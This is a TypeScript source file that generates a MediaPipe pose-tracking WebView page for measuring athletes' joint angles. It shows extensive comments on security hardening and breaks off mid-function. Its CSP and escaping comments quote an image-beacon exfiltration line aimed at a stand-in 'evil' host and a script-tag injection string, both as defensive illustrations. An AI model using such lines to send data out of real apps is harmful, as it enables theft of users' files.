/**
 * MediaPipe pose-tracking WebView document.
 *
 * One builder serves both screens so the angle maths and risk thresholds exist
 * in exactly one place:
 *
 *  - `mode: "interactive"` — the review player: scrub, step, change speed, and
 *    watch the skeleton overlay. Reports live angles for the on-screen cards.
 *
 *  - `mode: "scan"` — headless measurement. Steps the clip at fixed timestamps,
 *    accumulates per-joint statistics, and posts one `metrics` message at the
 *    end. This is what produces the numbers the server scores.
 *
 * ── Why scan mode seeks instead of playing ──────────────────────────────────
 * Sampling during realtime playback gives you whatever frames the device
 * happened to render, so the same clip measured twice yields different numbers
 * — which is exactly the "scores keep changing" complaint. Scan mode instead
 * seeks to N evenly-spaced timestamps derived from the clip's duration, so the
 * sample set is identical on every run and on every device. Same clip in, same
 * measurements out, same scores out.
 */

// Relative, not aliased: this module is exercised by vitest, which does not
// resolve the app's `@/` path alias.
import {
  profileForSport,
  RISK_PROFILE_VERSION,
  type RiskZones,
} from "../constants/riskProfiles";

export type PoseMode = "interactive" | "scan";

export const JOINT_KEYS = [
  "leftKnee",
  "rightKnee",
  "leftHip",
  "rightHip",
  "leftElbow",
  "rightElbow",
] as const;

export type JointKey = (typeof JOINT_KEYS)[number];

export interface JointStats {
  min: number;
  max: number;
  mean: number;
  stdDev: number;
}

/** Payload posted by scan mode and sent verbatim to POST /api/analyses. */
export interface PoseMetrics {
  frameCount: number;
  trackingQuality: number;
  durationSec: number;
  joints: Partial<Record<JointKey, JointStats>>;
  riskFrames: Partial<Record<JointKey, { caution: number; risk: number }>>;
  /**
   * Ordered readings per joint, index-aligned across joints, `null` where a
   * joint was not visible on that frame. Scan mode only — the interactive
   * overlay does not accumulate. Consumed by the server's consistency score.
   */
  series?: Partial<Record<JointKey, (number | null)[]>>;
  /**
   * Median shoulder-and-hip width against torso length across the clip — how
   * square the athlete stood to the camera. Near 0.75 filmed front-on, near 0.1
   * in profile. `null` when the torso was never fully visible. Gates the
   * left/right symmetry score, which profile footage cannot support.
   */
  facingRatio?: number | null;
  /**
   * The sport risk profile the frames were classified against — provenance for
   * every `riskFrames` count in this payload. Absent on clips measured by app
   * builds that predate per-sport profiles; those used the legacy fixed bands
   * (see constants/riskProfiles.ts `LEGACY_ZONES`).
   */
  riskProfile?: {
    id: string;
    version: number;
    zones: RiskZones;
  };
}

export type PoseMessage =
  | { type: "ready" }
  | { type: "meta"; vw: number; vh: number; dur: number }
  | { type: "progress"; done: number; total: number }
  | { type: "angles"; data: Record<JointKey, number>; risk: Record<JointKey, number>; maxLvl: number }
  | { type: "metrics"; metrics: PoseMetrics }
  | { type: "error"; message: string };

/**
 * How many timestamps scan mode samples, at most.
 *
 * The target rate is 12 samples/second (see the WebView script), so clips up
 * to 12.5s are sampled at full rate and longer clips spread the budget across
 * their duration. Raised from 90 on 2026-08-15: at 90, a 60-second clip was
 * sampled at 1.5 fps, sparse enough that a half-second knee collapse — the
 * exact event the risk flags exist to catch — could fall entirely between
 * samples. 150 doubles the fidelity of long clips at the cost of a slower
 * measurement (the progress bar is honest about it); the server's request
 * schema accepts up to 600 per joint, so this can rise again without a
 * protocol change.
 *
 * The floor lives server-side too: MIN_FRAMES_FOR_SCORING = 20 tracked frames.
 * MIN_CLIP_SECONDS below keeps clips that cannot mathematically clear that
 * floor from ever starting a measurement.
 */
export const SCAN_SAMPLES = 150;

/**
 * Shortest clip worth measuring. `max(10, dur × 12)` samples must comfortably
 * exceed the server's 20-tracked-frame floor even with imperfect tracking —
 * below this, the clip was guaranteed to fail with a message that blamed
 * lighting and camera angle for what was actually a length problem.
 */
export const MIN_CLIP_SECONDS = 3;

/**
 * Where the pose runtime is fetched from: our own API server.
 *
 * ── Why not the CDN it used to come from ────────────────────────────────────
 * This was `https://cdn.jsdelivr.net/npm/@mediapipe/pose@…`. jsDelivr is a free
 * public CDN with no data processing agreement and no Standard Contractual
 * Clauses, and it received every EU/UK athlete's IP address on every pose
 * session — a transfer to a third country with no contractual basis, which the
 * privacy policy then had to disclose as exactly that. The API server now
 * vendors and serves the same pinned bytes (see its
 * `scripts/fetch-mediapipe.mjs`, which verifies a SHA-384 for every file before
 * writing it), so the request goes to a processor already named in that
 * document.
 *
 * The version here must stay in step with `VERSION` in that script. The app asks
 * our server for these names by hand, so a bump on one side alone is a 404 at
 * the exact moment a user tries to film.
 */
const MEDIAPIPE_VERSION = "0.5.1675469404";

const MEDIAPIPE_BASE = `${resolveApiOrigin()}/assets/mediapipe`;

/**
 * The API origin, without the `/api` prefix the JSON client appends.
 *
 * Deliberately duplicated rather than imported from `lib/api.ts`: that module
 * pulls in the auth token store and the whole request layer, and this file is
 * imported by the WebView document builder, which needs nothing else from it.
 */
/**
 * The `connect-src` allowlist: ourselves, plus the API we fetch the runtime from.
 *
 * `'self'` on a `file://` document is the local directory, which is what the
 * staged clip is loaded from. `blob:` and `data:` are the shapes MediaPipe uses
 * internally for its own worker and asset plumbing; refusing them would break
 * the runtime rather than protect anything, since neither can name a remote host.
 *
 * The API origin is interpolated, so a deployment pointed at a different server
 * gets a policy naming that server — a hard-coded origin here would silently
 * become a policy that blocks the app's own assets the day the URL changes.
 */
function cspOrigin(): string {
  return `'self' blob: data: ${resolveApiOrigin()}`;
}

function resolveApiOrigin(): string {
  const configured = process.env.EXPO_PUBLIC_API_URL?.trim().replace(/\/+$/, "");
  if (configured) return configured;
  // Matches `resolveApiUrl`'s development fallback in lib/api.ts.
  return "http://localhost:3000";
}

/**
 * Subresource Integrity hash for `pose.js`, pinned to the exact version above.
 *
 * ── Why this matters ────────────────────────────────────────────────────────
 * This document runs from a `file://` origin, and both measurement screens grant
 * the WebView `allowFileAccessFromFileURLs` + `allowUniversalAccessFromFileURLs`
 * (needed so a file:// page can fetch the model cross-origin). That is a
 * privileged context: any script that runs here can read local files and POST
 * them anywhere. Loading the tracker entry script from a third-party CDN into
 * that context means a CDN compromise would run attacker code with exactly those
 * privileges. SRI makes the WebView refuse to execute `pose.js` unless its bytes
 * match this hash, so a tampered CDN response fails closed (the onerror handler
 * fires and measurement reports "unavailable") instead of executing.
 *
 * Regenerate on a version bump:
 *   curl -s https://cdn.jsdelivr.net/npm/@mediapipe/pose@<version>/pose.js \
 *     | openssl dgst -sha384 -binary | openssl base64 -A
 *
 * The WASM and model assets `pose.js` pulls at runtime via `locateFile` are not
 * SRI-covered — they are fetched by the wasm loader, not by `<script>` tags, so
 * there is no attribute to put a hash on. That used to mean 47 kB of the 22 MB
 * was integrity-checked and the rest, including the WebAssembly binary that
 * actually runs and the model it runs against, was taken from a CDN on trust.
 *
 * They are now vendored by the API server, which verifies a SHA-384 for every
 * one of the nine files before writing it and refuses the build on a mismatch —
 * so the integrity check moved from the device to the build, and covers all of
 * it rather than the entry script alone. This SRI stays as the second check on
 * the one file that can carry one.
 *
 * REMAINING GAP: both screens still grant `allowUniversalAccessFromFileURLs`,
 * because a `file://` document fetching from `https://` is cross-origin however
 * trustworthy the origin. Closing that means bundling all 22 MB into the app
 * itself; the size and the device-verification it needs made it a separate
 * decision. What made that flag dangerous — an unescaped, unvalidated video URI
 * reaching this document from a deep link — is fixed independently, in
 * `jsonForScript` below and `isLocalAppFile` in videoStore.ts.
 */
const MEDIAPIPE_POSE_SRI = "sha384-qcJQ+n/ZcF15Xu2EoRupB4Av+GEAGeW0Td1mp2A90u0NdNLzLYQVMUq1Ax1YAHqk";

/**
 * Serialize a value for interpolation into an inline `<script>` block.
 *
 * `JSON.stringify` escapes for the *JavaScript string* grammar. It does not
 * escape for the *HTML* grammar wrapped around it, and the HTML parser finds
 * `</script` before the JavaScript parser sees anything at all. So a value
 * containing `</script><script>…` closes our block and opens the attacker's,
 * and `JSON.stringify` faithfully reproduces it.
 *
 * That mattered here because the video URI reaching `buildPoseHtml` arrives
 * from a route param, `/analysis/measure?uri=…`, which is reachable from a deep
 * link — so the value is not ours. And the document it lands in is loaded with
 * `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs`, which
 * means script running there can read the user's recorded clips off the
 * filesystem and POST them anywhere.
 *
 * Escaping `<` to `\u003c` is equivalent inside a JavaScript string literal and
 * cannot form a tag. `&` and line separators go too, for the same class of
 * reason.
 */
function jsonForScript(value: unknown): string {
  return JSON.stringify(value ?? null)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}

export function buildPoseHtml(options: {
  videoUri?: string;
  mode: PoseMode;
  /**
   * The athlete's sport, used to select the risk-classification bands. What
   * counts as a flag-worthy joint position differs by sport — a locked elbow
   * overhead is required in weightlifting and a caution sign in gymnastics —
   * so the bands travel with the clip's sport. Omitted or unrecognised sports
   * classify against the conservative generic profile.
   */
  sport?: string;
}): string {
  const { videoUri, mode, sport } = options;
  const isScan = mode === "scan";
  const profile = profileForSport(sport);

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<!--
  Content Security Policy — the exfiltration half of the file:// privilege.

  This document runs with \`allowFileAccessFromFileURLs\` and
  \`allowUniversalAccessFromFileURLs\`, which it needs because it fetches the pose
  runtime over https from a file:// origin. The danger those flags create is not
  that script here can *read* local files — it is that it can read them and then
  send them somewhere. \`connect-src\` is what closes the second half: fetch, XHR,
  WebSocket and sendBeacon can only reach our own API, so there is nowhere for a
  stolen clip to go. \`img-src\` closes the oldest workaround for exactly that
  (\`new Image().src = "https://evil/?" + data\`), and \`form-action\` the other one.

  ── What is deliberately NOT restricted ──────────────────────────────────────
  There is no \`default-src\` and no \`script-src\` here, and that is a choice, not
  an omission. Restricting those correctly around a WebAssembly module that
  compiles a 6 MB binary and spawns its own workers is exactly the kind of change
  that looks right, ships, and then fails on one iOS version — and pose tracking
  is the product. Without \`default-src\`, an unlisted directive is simply
  unrestricted, so what is written below is the whole of what is enforced, and
  none of it touches how the runtime loads.

  The directives that would matter most against *injected script running here*
  are the ones listed. The directives that would stop it running at all are the
  ones that need a device to verify.
-->
<meta http-equiv="Content-Security-Policy" content="connect-src ${cspOrigin()}; img-src 'self' data: blob:; media-src 'self' blob: data: file:; form-action 'none'; base-uri 'none'; frame-ancestors 'none'">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{width:100%;height:100%;overflow:hidden;background:#101312;font-family:-apple-system,sans-serif;color:#EDECE7}
/* The stage takes whatever height the controls leave, as a flex child.
   It used to be sized imperatively - wrap.style.height = innerHeight minus the
   control bar, on load and on resize - against a viewport that was still the
   INITIAL WebView height. The native side starts from a 16/9 guess for the clip
   and re-lays-out once the real aspect arrives, and that second layout produced
   no resize event the page saw, so the stage stayed at its first-guess height:
   on a portrait clip the video rendered about 236pt tall inside a 542pt area,
   with roughly 300pt of dead black between it and the transport bar.
   Flex has no first guess to be stale about. */
body{display:flex;flex-direction:column}
#wrap{position:relative;width:100%;flex:1;min-height:0;background:#000}
video,canvas{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:contain}
canvas{pointer-events:none}
#badge{position:absolute;top:10px;left:10px;display:flex;align-items:center;gap:6px;
  background:rgba(16,19,18,.88);border:1px solid rgba(36,54,232,.30);
  border-radius:20px;padding:5px 12px;font-size:11px;font-weight:700;color:#2436E8}
#dot{width:7px;height:7px;border-radius:50%;background:#2436E8;box-shadow:0 0 6px #2436E8;flex-shrink:0}
#empty{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;
  justify-content:center;gap:10px;color:#3a3a5c;font-size:13px}
#loading{position:fixed;inset:0;z-index:99;background:rgba(16,19,18,.92);
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;padding:24px;text-align:center}
#loading.hide{display:none}
.spin{width:38px;height:38px;border:3px solid rgba(36,54,232,0.2);border-top-color:#2436E8;
  border-radius:50%;animation:sp .75s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.load-text{font-size:14px;font-weight:600}
.load-sub{font-size:11px;color:#75787A;line-height:1.5}
.retry{margin-top:14px;background:#2436E8;border:none;color:#101312;padding:9px 20px;
  border-radius:10px;font-size:13px;font-weight:700;cursor:pointer}
#ctrl{flex:none;background:rgba(16,19,18,.96);
  padding:10px 14px 14px;display:flex;flex-direction:column;gap:9px}
.row{display:flex;align-items:center;gap:8px}
#timeL,#timeR{font-size:11px;color:#75787A;font-variant-numeric:tabular-nums;min-width:32px}
#timeR{text-align:right}
#scrub{flex:1;height:4px;accent-color:#2436E8;cursor:pointer}
.tbtn{background:#1C1F21;border:none;border-radius:10px;color:#EDECE7;
  display:flex;align-items:center;justify-content:center;cursor:pointer}
#playBtn{width:42px;height:42px;background:#2436E8;border-radius:13px;color:#101312;
  box-shadow:0 0 18px rgba(36,54,232,.5)}
.step{width:34px;height:34px;font-size:16px}
#speeds{display:flex;gap:2px;background:#1C1F21;padding:4px;border-radius:10px}
.spd{border:none;background:transparent;color:#75787A;font-size:11px;font-weight:700;
  padding:4px 9px;border-radius:7px;cursor:pointer;transition:all .15s}
.spd.on{background:#2436E8;color:#101312}
#skelBtn{padding:6px 11px;font-size:11px;font-weight:700;border-radius:9px;cursor:pointer;
  border:1px solid transparent;transition:all .15s}
#skelBtn.on{background:rgba(36,54,232,.12);color:#2436E8;border-color:rgba(36,54,232,.28)}
#skelBtn.off{background:#1C1F21;color:#75787A}
#legend{position:absolute;top:10px;right:10px;display:flex;flex-direction:column;gap:5px;
  background:rgba(16,19,18,.82);border:1px solid rgba(255,255,255,.08);border-radius:11px;padding:8px 11px}
.lg{display:flex;align-items:center;gap:7px;font-size:10px;font-weight:700;color:#EDECE7;letter-spacing:.3px}
.lgsep{margin-top:3px;padding-top:5px;border-top:1px solid rgba(255,255,255,.10)}
.ld{width:9px;height:9px;border-radius:50%;flex-shrink:0}
</style>
</head>
<body>
<div id="wrap">
  ${
    videoUri
      ? `<video id="v" playsinline webkit-playsinline muted preload="auto"${isScan ? "" : " loop"}></video>
       <canvas id="c"></canvas>
       ${
         isScan
           ? ""
           : `<div id="badge"><div id="dot"></div><span id="btxt">Loading AI…</span></div>
       <div id="legend">
         <div class="lg"><span class="ld" style="background:#5B8DEF"></span>LEFT</div>
         <div class="lg"><span class="ld" style="background:#4CAF82"></span>RIGHT</div>
         <div class="lg lgsep"><span class="ld" style="background:#8A8D8F"></span>CAUTION</div>
         <div class="lg"><span class="ld" style="background:#D2683F"></span>FLAGGED</div>
       </div>`
       }`
      : `<div id="empty"><p>No video available</p></div>`
  }
</div>

${
  videoUri && !isScan
    ? `
<div id="ctrl">
  <div class="row">
    <span id="timeL">0:00</span>
    <input id="scrub" type="range" min="0" max="100" step="0.1" value="0">
    <span id="timeR">0:00</span>
  </div>
  <div class="row" style="justify-content:space-between">
    <div class="row" style="gap:6px">
      <button class="tbtn step" id="bk">&#9664;</button>
      <button class="tbtn" id="playBtn">&#9654;</button>
      <button class="tbtn step" id="fw">&#9654;|</button>
    </div>
    <div class="row" style="gap:6px">
      <div id="speeds">
        <button class="spd" data-s="0.25">0.25&times;</button>
        <button class="spd" data-s="0.5">0.5&times;</button>
        <button class="spd on" data-s="1">1&times;</button>
      </div>
      <button class="tbtn on" id="skelBtn">Skeleton</button>
    </div>
  </div>
</div>`
    : ""
}

<div id="loading">
  <div class="spin"></div>
  <p class="load-text">${isScan ? "Measuring your movement…" : "Loading pose model…"}</p>
  <!-- The figure was "~6 MB" and had been wrong since this build pinned
       modelComplexity: 1. The "full" landmark model alone is 6.4 MB, and a cold
       run also fetches both wasm variants (the SIMD one and the non-SIMD
       fallback, because pose.js requests both and lets the browser choose),
       their glue, the packed detector assets and the graph — 21 MB in total,
       byte-counted against the pinned version. Understating a download by 3.5x
       to someone on cellular is the kind of small dishonesty that costs trust
       for nothing. -->
  <p class="load-sub" id="loadSub">First run downloads about 21&nbsp;MB.<br>Later runs load from cache.</p>
</div>

<script src="${MEDIAPIPE_BASE}/pose.js" crossorigin="anonymous"
  integrity="${MEDIAPIPE_POSE_SRI}"
  onerror="window.__poseScriptFailed = true"></script>
<script>
(function(){
  "use strict";
  var VIDEO_URI = ${jsonForScript(videoUri)};
  var IS_SCAN = ${isScan ? "true" : "false"};
  var SCAN_SAMPLES = ${SCAN_SAMPLES};
  // Sport-specific classification bands (see constants/riskProfiles.ts).
  // Serialized into the document so the WebView classifies frames against
  // exactly the profile this build selected — and reports it back as
  // provenance alongside the counts it produced.
  var ZONES = ${jsonForScript(profile.zones)};
  var RISK_PROFILE = ${jsonForScript({ id: profile.id, version: RISK_PROFILE_VERSION, zones: profile.zones })};

  function post(msg){
    try { window.ReactNativeWebView.postMessage(JSON.stringify(msg)); } catch(e){}
  }
  function fail(message){
    var el = document.getElementById("loading");
    if (el) {
      el.classList.remove("hide");
      el.innerHTML = '<p class="load-text" style="color:#ef4444">Pose tracking unavailable</p>' +
        '<p class="load-sub">' + message + '</p>' +
        '<button class="retry" onclick="location.reload()">Try again</button>';
    }
    post({ type: "error", message: message });
  }

  if (!VIDEO_URI) { document.getElementById("loading").classList.add("hide"); return; }
  if (window.__poseScriptFailed || typeof Pose === "undefined") {
    fail("Couldn't load the pose model. Check your internet connection and try again.");
    return;
  }

  var video   = document.getElementById("v");
  var canvas  = document.getElementById("c");
  var ctx     = canvas.getContext("2d");
  var loading = document.getElementById("loading");
  var loadSub = document.getElementById("loadSub");
  var btxt    = document.getElementById("btxt");

  var busy = false, playing = false, showSkel = true;

  // ── Skeleton topology ──
  //
  // Drawn as a body, not a wire diagram. Three things make the difference:
  //
  //  1. **Segments taper.** A humerus is thicker than a forearm and a thigh is
  //     thicker than a shin. Uniform strokes are what made the old overlay read
  //     as a stick figure — real limbs have mass, and mass is what lets you see
  //     which way a joint is rotated.
  //  2. **Every width is a fraction of the athlete's own shoulder width**, so
  //     the figure keeps human proportions whether the clip is a close-up or
  //     shot from across the gym.
  //  3. **Left and right carry different hues.** Asymmetry is the thing an
  //     athlete most needs to see, and it is invisible when both sides are the
  //     same colour.
  // Traffic-light risk colours, matching the muscle map on the analysis
  // screen: amber = caution, red = flagged. One vocabulary everywhere.
  // Limb colour by risk level, mirroring bandColor in constants/caliper.ts on a
  // dark ground: within band is onInk, caution is the muted neutral, and only
  // level 2 takes the alarm colour.
  //
  // Was ["#EDECE7","#E8A33D","#D63A2F"], a traffic light. caliper.ts names that
  // arrangement as the thing not to do - "an amber tier would compete with the
  // flag colour and dilute rule 2" - and this legend sat two taps from the
  // muscle map's legend saying the same two states in rust. Amber-and-red is
  // also the worst pairing for red-green colour blindness; neutral-and-rust
  // separates by saturation instead.
  //
  // #D2683F is rustOnInk: rust proper is only 3.20:1 against ink, which is why
  // the dark-ground variant exists.
  var RL=["#EDECE7","#8A8D8F","#D2683F"];

  // Body-part identity. These are the base colours; a flagged joint overrides
  // them so a finding still outranks anatomy. Right is green rather than the
  // earlier amber, which the caution colour now owns.
  var PART={
    left:  "#5B8DEF",
    right: "#4CAF82",
    trunk: "rgba(237,236,231,0.42)",
    head:  "rgba(237,236,231,0.70)"
  };

  // [proximal, distal, proximalWidth, distalWidth, side] — widths in shoulder
  // widths. Ratios follow segment-girth anthropometry closely enough to read
  // correctly; they are for legibility, not for measurement.
  var LIMBS=[
    [11,13,0.115,0.085,"left"],  [13,15,0.085,0.060,"left"],
    [12,14,0.115,0.085,"right"], [14,16,0.085,0.060,"right"],
    [23,25,0.165,0.115,"left"],  [25,27,0.115,0.072,"left"],
    [24,26,0.165,0.115,"right"], [26,28,0.115,0.072,"right"]
  ];

  // Hands and feet, drawn thin so they read as extremities rather than limbs.
  var EXTREM=[
    [15,19,0.050,0.030,"left"],  [15,17,0.045,0.026,"left"],
    [16,20,0.050,0.030,"right"], [16,18,0.045,0.026,"right"],
    [27,31,0.060,0.034,"left"],  [27,29,0.055,0.038,"left"],
    [28,32,0.060,0.034,"right"], [28,30,0.055,0.038,"right"]
  ];

  // Joints worth a marker. The measured six get a ring; the rest stay quiet so
  // the flagged joints are the ones the eye lands on.
  var KJ=[11,12,13,14,15,16,23,24,25,26,27,28];

  // A limb segment drawn as a muscle, not a strut: the sides bow outward to a
  // belly just proximal of centre — where the muscle mass actually sits on a
  // human — and taper into both joints. Round caps fuse consecutive segments
  // at the joint instead of showing a seam. Straight tapered quads were the
  // last thing keeping the figure looking like scaffolding.
  function limb(pA,pB,wA,wB,col,glow){
    var dx=pB.x-pA.x, dy=pB.y-pA.y, L=Math.sqrt(dx*dx+dy*dy);
    if(L<0.5) return;
    var nx=-dy/L, ny=dx/L;
    var mx=pA.x+dx*0.42, my=pA.y+dy*0.42;
    var belly=Math.max(wA,wB)*1.28;
    ctx.save();
    ctx.fillStyle=col;
    if(glow){ ctx.shadowBlur=glow; ctx.shadowColor=col; }
    ctx.beginPath();
    ctx.moveTo(pA.x+nx*wA*0.9, pA.y+ny*wA*0.9);
    ctx.quadraticCurveTo(mx+nx*belly, my+ny*belly, pB.x+nx*wB*0.85, pB.y+ny*wB*0.85);
    ctx.lineTo(pB.x-nx*wB*0.85, pB.y-ny*wB*0.85);
    ctx.quadraticCurveTo(mx-nx*belly, my-ny*belly, pA.x-nx*wA*0.9, pA.y-ny*wA*0.9);
    ctx.closePath(); ctx.fill();
    ctx.beginPath(); ctx.arc(pA.x,pA.y,wA*0.9,0,6.2832); ctx.fill();
    ctx.beginPath(); ctx.arc(pB.x,pB.y,wB*0.85,0,6.2832); ctx.fill();
    ctx.restore();
  }

  function ang(a,b,c){
    var ab={x:a.x-b.x,y:a.y-b.y}, cb={x:c.x-b.x,y:c.y-b.y};
    return Math.round(Math.atan2(Math.abs(ab.x*cb.y-ab.y*cb.x), ab.x*cb.x+ab.y*cb.y)*180/Math.PI);
  }
  // Risk banding against the sport's zones. Which extremes matter — and
  // whether a fully straight limb is a finding at all — depends on the sport;
  // the zones were selected by buildPoseHtml and injected above.
  function lvl(a,z){
    if(a<=z.loRisk||a>=z.hiRisk) return 2;
    if(a<=z.loWarn||a>=z.hiWarn) return 1;
    return 0;
  }

  // ── Measurement accumulators (scan mode) ──
  var KEYS = ["leftKnee","rightKnee","leftHip","rightHip","leftElbow","rightElbow"];
  var acc = {};
  // Ordered readings per joint, one entry per tracked frame, null where the
  // joint was not visible. Consistency is rep-to-rep agreement, which is a
  // property of the sequence — the aggregates below cannot express it, so the
  // sequence itself has to travel. Bounded by SCAN_SAMPLES, so this is at most
  // 6 x 90 numbers.
  var series = {};
  KEYS.forEach(function(k){
    acc[k] = { n:0, sum:0, sumSq:0, min:Infinity, max:-Infinity, caution:0, risk:0 };
    series[k] = [];
  });
  var trackedFrames = 0, attemptedFrames = 0;

  // Push one entry per joint per tracked frame, so index N means the same
  // instant for every joint. Alignment is what makes the cycles comparable.
  function recordFrame(seen){
    KEYS.forEach(function(k){
      series[k].push(k in seen ? seen[k] : null);
    });
  }

  // ── How square the athlete is to the camera ──
  //
  // Left/right symmetry can only be compared when both sides are actually in
  // view. Filmed side-on — which is what we ask for, because it is the right
  // angle for knee and hip flexion — one side is behind the other and its
  // landmarks are inferred rather than seen.
  //
  // Shoulder and hip separation collapse toward zero as the athlete turns to
  // profile, so their width against torso length reads the view angle directly.
  // Square to camera lands near 0.75 (shoulder breadth is about 0.85 of
  // shoulder-to-hip length, hip breadth about 0.65); true profile lands near
  // 0.1. Torso pitch during a squat shortens the projected torso and inflates
  // the ratio by at most ~1.4x, which is far smaller than the ~7x gap between
  // the two views, and the median across frames damps it further.
  var facings = [];
  function recordFacing(pt, vis){
    if (!(vis(11) && vis(12) && vis(23) && vis(24))) return;
    var ls = pt(11), rs = pt(12), lh = pt(23), rh = pt(24);
    var shoulderSep = Math.abs(ls.x - rs.x);
    var hipSep = Math.abs(lh.x - rh.x);
    var midSx = (ls.x + rs.x) / 2, midSy = (ls.y + rs.y) / 2;
    var midHx = (lh.x + rh.x) / 2, midHy = (lh.y + rh.y) / 2;
    var torso = Math.sqrt((midSx - midHx) * (midSx - midHx) + (midSy - midHy) * (midSy - midHy));
    if (torso <= 1) return;
    facings.push((shoulderSep + hipSep) / (2 * torso));
  }

  function medianFacing(){
    if (facings.length === 0) return null;
    var sorted = facings.slice().sort(function(a, b){ return a - b; });
    var mid = Math.floor(sorted.length / 2);
    var v = sorted.length % 2 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
    return Math.round(v * 1000) / 1000;
  }

  function record(key, deg, level){
    var a = acc[key];
    a.n++; a.sum += deg; a.sumSq += deg*deg;
    if (deg < a.min) a.min = deg;
    if (deg > a.max) a.max = deg;
    if (level === 1) a.caution++;
    else if (level === 2) a.risk++;
  }

  function buildMetrics(){
    var joints = {}, riskFrames = {}, out = {};
    KEYS.forEach(function(k){
      var a = acc[k];
      if (a.n === 0) return;
      out[k] = series[k];
      var mean = a.sum / a.n;
      var variance = Math.max(0, a.sumSq / a.n - mean * mean);
      joints[k] = {
        min: Math.round(a.min),
        max: Math.round(a.max),
        mean: Math.round(mean * 10) / 10,
        stdDev: Math.round(Math.sqrt(variance) * 10) / 10
      };
      riskFrames[k] = { caution: a.caution, risk: a.risk };
    });
    return {
      frameCount: trackedFrames,
      trackingQuality: attemptedFrames > 0 ? Math.round((trackedFrames / attemptedFrames) * 100) / 100 : 0,
      durationSec: Math.round((video.duration || 0) * 10) / 10,
      joints: joints,
      riskFrames: riskFrames,
      series: out,
      facingRatio: medianFacing(),
      riskProfile: RISK_PROFILE
    };
  }

  // ── Per-frame results ──
  function onResults(res){
    busy = false;
    var W = video.videoWidth || 640, H = video.videoHeight || 360;
    canvas.width = W; canvas.height = H;
    ctx.clearRect(0,0,W,H);

    var lm = res.poseLandmarks;
    attemptedFrames++;
    if (!lm) { advanceScan(); return; }

    var vis = function(i){ return (lm[i] && lm[i].visibility || 0) > 0.35; };
    var pt  = function(i){ return { x: lm[i].x * W, y: lm[i].y * H }; };

    var jr = {};
    if(vis(23)&&vis(25)&&vis(27)){var a1=ang(pt(23),pt(25),pt(27));jr[25]={deg:a1,lvl:lvl(a1,ZONES.knee),key:"leftKnee"};}
    if(vis(24)&&vis(26)&&vis(28)){var a2=ang(pt(24),pt(26),pt(28));jr[26]={deg:a2,lvl:lvl(a2,ZONES.knee),key:"rightKnee"};}
    if(vis(11)&&vis(23)&&vis(25)){var a3=ang(pt(11),pt(23),pt(25));jr[23]={deg:a3,lvl:lvl(a3,ZONES.hip),key:"leftHip"};}
    if(vis(12)&&vis(24)&&vis(26)){var a4=ang(pt(12),pt(24),pt(26));jr[24]={deg:a4,lvl:lvl(a4,ZONES.hip),key:"rightHip"};}
    if(vis(11)&&vis(13)&&vis(15)){var a5=ang(pt(11),pt(13),pt(15));jr[13]={deg:a5,lvl:lvl(a5,ZONES.elbow),key:"leftElbow"};}
    if(vis(12)&&vis(14)&&vis(16)){var a6=ang(pt(12),pt(14),pt(16));jr[14]={deg:a6,lvl:lvl(a6,ZONES.elbow),key:"rightElbow"};}

    var measured = Object.keys(jr);
    if (measured.length > 0) {
      trackedFrames++;
      var seen = {};
      measured.forEach(function(idx){
        record(jr[idx].key, jr[idx].deg, jr[idx].lvl);
        seen[jr[idx].key] = jr[idx].deg;
      });
      if (IS_SCAN) { recordFrame(seen); recordFacing(pt, vis); }
    }

    if (IS_SCAN) { advanceScan(); return; }

    // ── Interactive drawing ──
    if (!showSkel) return;
    var maxLvl = 0;
    measured.forEach(function(i){ if (jr[i].lvl > maxLvl) maxLvl = jr[i].lvl; });

    // Everything scales off the athlete's shoulder span, so proportions survive
    // any framing. Falls back to hip span, then to a constant, so a partially
    // visible athlete still draws something sane rather than collapsing to zero.
    var S = 0;
    if (vis(11) && vis(12)) { var s1=pt(11), s2=pt(12); S=Math.sqrt((s1.x-s2.x)*(s1.x-s2.x)+(s1.y-s2.y)*(s1.y-s2.y)); }
    if (S < 8 && vis(23) && vis(24)) { var h1=pt(23), h2=pt(24); S=Math.sqrt((h1.x-h2.x)*(h1.x-h2.x)+(h1.y-h2.y)*(h1.y-h2.y))*1.15; }
    if (S < 8) S = 90;

    // Colour for a segment: a flagged joint at either end wins, otherwise the
    // limb keeps its side's hue.
    function segColor(a,b,side){
      var rm = Math.max(jr[a] ? jr[a].lvl : -1, jr[b] ? jr[b].lvl : -1);
      if (rm >= 1) return { col: RL[rm], glow: rm >= 2 ? 18 : 10 };
      return { col: PART[side], glow: 0 };
    }

    ctx.save();
    ctx.globalAlpha = 0.94;

    // ── Trunk ──
    // A filled torso between the shoulders and hips, with the sides bowed
    // inward at the waist — a straight-sided box read as a crate. The old
    // overlay drew the torso as four separate lines around an empty middle,
    // which is most of why the figure read as a wireframe instead of a person.
    if (vis(11) && vis(12) && vis(23) && vis(24)) {
      var sL=pt(11), sR=pt(12), hL=pt(23), hR=pt(24);
      var mSp={x:(sL.x+sR.x+hL.x+hR.x)/4, y:(sL.y+sR.y+hL.y+hR.y)/4};
      function waistCtl(a,b){
        var p={x:(a.x+b.x)/2,y:(a.y+b.y)/2};
        return {x:p.x+(mSp.x-p.x)*0.30, y:p.y+(mSp.y-p.y)*0.30};
      }
      var cR=waistCtl(sR,hR), cL=waistCtl(hL,sL);
      ctx.fillStyle = PART.trunk;
      ctx.beginPath();
      ctx.moveTo(sL.x,sL.y); ctx.lineTo(sR.x,sR.y);
      ctx.quadraticCurveTo(cR.x,cR.y,hR.x,hR.y);
      ctx.lineTo(hL.x,hL.y);
      ctx.quadraticCurveTo(cL.x,cL.y,sL.x,sL.y);
      ctx.closePath(); ctx.fill();

      // Spine, shoulder girdle and pelvis as solid bars: the three structures a
      // coach actually reads posture from.
      var mS={x:(sL.x+sR.x)/2,y:(sL.y+sR.y)/2}, mH={x:(hL.x+hR.x)/2,y:(hL.y+hR.y)/2};
